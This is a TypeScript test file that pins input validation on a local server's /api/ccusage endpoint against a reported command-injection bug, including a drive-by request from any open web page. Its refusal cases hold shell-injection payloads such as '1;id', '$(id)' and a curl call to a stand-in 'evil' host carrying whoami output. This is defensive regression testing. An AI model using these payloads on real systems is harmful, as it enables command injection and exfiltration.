// GET /api/ccusage read `since` and `until` straight off the query string and
// handed them to fetchCcusageDaily, which puts them in the argument vector of a
// spawned CLI. There was no validation of any kind, and a GET needs no CORS, no
// preflight and no ability to read the answer — so any page the user had open
// could aim `new Image().src = "http://127.0.0.1:4317/api/ccusage?since=…"` at
// the deck. The spawn no longer goes through a shell (ccusage-no-shell.test.ts
// pins that half), which makes this the second lock rather than the only one;
// it is also the one that keeps the pair honest if a shell is ever
// reintroduced downstream.
//
// These pin the grammar and pin that the route enforces it before anything gets
// near a child process.
import { describe, it, expect, afterAll, beforeAll, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { get, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";

// Temp home, set before the dynamic import: the server resolves its config
// directories at import time and the real ~/.claude must stay untouched.
const DIR = mkdtempSync(join(tmpdir(), "ccdeck-ccusage-range-"));
const prevEnv = { ...process.env };
process.env.HOME = DIR;
process.env.USERPROFILE = DIR;
process.env.CLAUDE_CONFIG_DIR = join(DIR, "claude");
process.env.CODEX_HOME = join(DIR, "codex");
// A request that gets PAST the gate reaches the real fetchCcusageDaily, and
// what happens THERE has to be pinned here rather than left to whatever the
// machine running the suite happens to have installed. Two variables, and they
// are not interchangeable.
//
// Installs off, because this temp home has no managed ccusage and the accepted
// cases would otherwise each try to `npm install ccusage@latest` off the
// registry.
process.env.AGENTS_DECK_NO_INSTALL = "1";
// And an override naming a file that is not there, which is what actually keeps
// the gate the only thing under test.
//
// The comment this replaces said installs-off was enough — that getRunner
// "refuses immediately and nothing is ever spawned". That stopped being true
// when #433 gave getRunner its PATH branch, and the branch sits BEFORE the
// installs-off check by design: PATH before installing is what stops the deck
// downloading a second copy of a tool the machine already has. So on any
// machine whose developer has ccusage on PATH — the common case, and this one —
// every accepted request ran that copy instead of refusing. Twice, because
// `--by-agent` fails on a home with no Claude data and runDaily retries the
// flagless form. Measured at 1.2-3.5s a case against vitest's 5000ms default,
// which is #491: not a slow endpoint, an endpoint doing real work nobody
// intended it to do.
//
// An override that does not resolve throws `bad_override` before any process
// starts, and tagged failures are never retried — so this costs one refusal and
// no child at all. It also makes the answer the same everywhere, which the
// PATH-dependent version never was: these cases were fast or slow, and on CI
// will be present or absent, according to whether ccusage happens to be
// installed. Resolution itself is ccusage-user-path.test.ts's subject, not this
// file's.
//
// Either way the assertion is untouched: the question is 400 versus not-400.
process.env.AGENTS_DECK_CCUSAGE = join(DIR, "no-such-ccusage");

// @ts-expect-error — .mjs server module, no types
const { startServer, isCliDate } = await import("../../server/index.mjs");

// Stated, not inherited. With the spawn gone every case here is a refusal that
// costs about a millisecond, so this is not a margin these tests need to spend —
// it is the budget being a decision. vitest's defaults are 5000ms for a test and
// 10000ms for a hook, and both were reached by nobody choosing them: the four
// request cases sat at 67-71% of the first on a pass and failed together once
// the machine was busy enough, which is the condition a shared CI runner is in
// by default rather than by accident.
//
// 20s matches the smallest budget the other server-booting suites here already
// state for themselves (log-line-atomic and session-cache-prune say 60s,
// deck-token-redaction and sse-resume-backpressure 30s, codex-memory-single-writer
// 25s) — this file was the one doing real per-case work and still on the
// default. hookTimeout is set for the same reason and is not decoration:
// `beforeAll` boots a real HTTP server, which is the one genuinely variable cost
// left in the file.
vi.setConfig({ testTimeout: 20_000, hookTimeout: 20_000 });

let server: Server;
let port = 0;

beforeAll(async () => {
  server = await startServer({ port: 0, host: "127.0.0.1", persist: null, codex: false });
  port = (server.address() as AddressInfo).port;
});

afterAll(async () => {
  await new Promise<void>(done => {
    server.closeAllConnections?.();
    server.close(() => done());
  });
  for (const k of ["HOME", "USERPROFILE", "CLAUDE_CONFIG_DIR", "CODEX_HOME",
    "AGENTS_DECK_NO_INSTALL", "AGENTS_DECK_CCUSAGE"]) {
    if (prevEnv[k] === undefined) delete process.env[k];
    else process.env[k] = prevEnv[k];
  }
  rmSync(DIR, { recursive: true, force: true });
});

function ccusage(query: string): Promise<{ status: number; body: Record<string, unknown> }> {
  return new Promise((resolve, reject) => {
    get({ host: "127.0.0.1", port, path: `/api/ccusage${query}` }, res => {
      let out = "";
      res.setEncoding("utf8");
      res.on("data", c => { out += c; });
      res.on("end", () => {
        try { resolve({ status: res.statusCode ?? 0, body: JSON.parse(out) }); }
        catch (e) { reject(e); }
      });
    }).on("error", reject);
  });
}

describe("isCliDate", () => {
  it("accepts a YYYYMMDD date and an absent parameter", () => {
    for (const ok of ["20260101", "19700101", "99999999", undefined]) {
      expect(isCliDate(ok)).toBe(true);
    }
  });

  it("refuses anything that is not eight digits", () => {
    for (const bad of [
      "1;id",            // the report's own payload
      "1;curl evil/$(whoami);",
      "2026-01-01",      // ISO, which ccusage's CLI does not take here
      "2026010",         // seven
      "202601011",       // nine
      "2026010a",
      " 20260101",
      "20260101 ",
      "$(id)",
      "`id`",
      "--help",
    ]) {
      expect(isCliDate(bad)).toBe(false);
    }
  });

  it("is a shape and not a calendar, deliberately", () => {
    // 99999999 is no more dangerous as an argv element than 20260101 is, and
    // what a date outside the logs means is ccusage's answer to give. Pinned so
    // nobody "fixes" this into a half-calendar that accepts 20260231 and
    // rejects 20260230.
    expect(isCliDate("99999999")).toBe(true);
    expect(isCliDate("20260231")).toBe(true);
    expect(isCliDate("20261301")).toBe(true);
  });
});

describe("GET /api/ccusage", () => {
  it("answers 400 for a since the shell would have read as syntax", async () => {
    const { status, body } = await ccusage("?since=1;id");

    expect(status).toBe(400);
    expect(body.ok).toBe(false);
    expect(body.reason).toBe("bad_range");
    // The refusal says what was expected, which is the whole job of a 400.
    expect(String(body.error)).toContain("YYYYMMDD");
  });

  it("answers 400 for the percent-encoded form too", async () => {
    // searchParams decodes, so `%3B` arrives as `;` — the shape the original
    // report used to get past a browser's URL handling.
    const { status, body } = await ccusage("?since=1%3Bcurl%20evil%2F%24(whoami)%3B");
    expect(status).toBe(400);
    expect(body.reason).toBe("bad_range");
  });

  it("validates until exactly as strictly as since", async () => {
    // until was the quieter half: the client never sends it, so nothing but a
    // test ever exercises it, and it reached the same argv.
    const { status, body } = await ccusage("?since=20260101&until=1;id");
    expect(status).toBe(400);
    expect(body.reason).toBe("bad_range");
  });

  it("lets a real YYYYMMDD range through", async () => {
    const { status, body } = await ccusage("?since=20260101&until=20260131");

    // Past the gate. What comes back is fetchCcusageDaily's own verdict — here
    // the unresolvable override set at the top — and the point is only that the
    // route did not refuse it.
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");

    // And pinned exactly, on the one case that says so, because "not bad_range"
    // is true of every failure this endpoint has and would go on being true if
    // the override stopped taking effect. `bad_override` is thrown before any
    // process starts; `run_failed` is what a spawn that actually happened
    // leaves behind. Asserting which one arrives is what keeps #491 fixed —
    // without it the only symptom of the child process coming back is these
    // cases quietly getting seconds slower again, which is precisely how this
    // went unnoticed until a loaded machine turned it into a timeout.
    expect(body.reason).toBe("bad_override");
  });

  it("still answers with both parameters absent", async () => {
    const { status, body } = await ccusage("");
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");
  });

  it("treats an empty since as absent rather than invalid", async () => {
    // `?since=` is what an unset input serialises to; it means "no opinion",
    // and ccusage.mjs fills in the default 30-day range.
    const { status, body } = await ccusage("?since=&until=");
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");
  });

  it("accepts eight digits that are not a real date", async () => {
    const { status, body } = await ccusage("?since=99999999");
    expect(status).toBe(200);
    expect(body.reason).not.toBe("bad_range");
  });
});
